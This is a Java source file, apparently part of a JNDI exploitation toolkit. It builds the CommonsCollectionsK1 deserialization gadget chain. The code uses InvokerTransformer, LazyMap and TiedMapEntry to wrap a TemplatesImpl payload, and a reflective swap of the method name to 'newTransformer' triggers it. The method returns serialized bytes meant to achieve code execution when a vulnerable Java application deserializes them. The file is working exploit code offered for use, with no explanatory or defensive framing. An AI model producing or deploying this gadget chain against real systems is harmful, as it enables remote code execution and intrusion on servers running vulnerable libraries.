package map.jndi.gadget;

import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK1 {
    public static byte[] create(TemplatesImpl templatesImpl) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Map innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tme = new TiedMapEntry(m, templatesImpl);

        outerMap.put(tme, "t");
        innerMap.clear();

        ReflectUtil.setFieldValue(transformer, "iMethodName", "newTransformer");

        return SerializeUtil.serialize(outerMap);
    }
}
